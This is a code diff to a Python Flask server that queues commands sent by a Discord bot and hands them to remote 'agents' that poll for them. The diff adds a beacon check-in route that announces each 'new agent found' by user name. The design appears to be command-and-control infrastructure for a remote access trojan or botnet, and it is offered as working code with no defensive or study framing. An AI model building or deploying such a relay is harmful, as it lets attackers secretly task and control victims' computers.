@@ -1,17 +1,23 @@
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-# This list holds the commands until the agent is ready for them
 command_queue = []
 
-# This is where your Discord Bot sends commands
+# Beacon route: Reports when an agent runs
+@app.route('/checkin', methods=['POST'])
+def checkin():
+    data = request.json
+    print(f"!!! NEW AGENT FOUND: {data.get('user')} !!!")
+    return jsonify({"status": "acknowledged"}), 200
+
+# Command route: Bot sends commands here
 @app.route('/send_command', methods=['POST'])
 def send_command():
     data = request.json
     command_queue.append(data['command'])
     return jsonify({"status": "command_received"}), 200
 
-# This is where your Agent asks for new instructions
+# Agent route: Agent fetches commands here
 @app.route('/get_command', methods=['GET'])
 def get_command():
     if command_queue:
@@ -19,5 +25,4 @@ def get_command():
     return jsonify({"command": "none"}), 200
 
 if __name__ == '__main__':
-    # Railway will provide the PORT automatically
     app.run(host='0.0.0.0', port=5000)
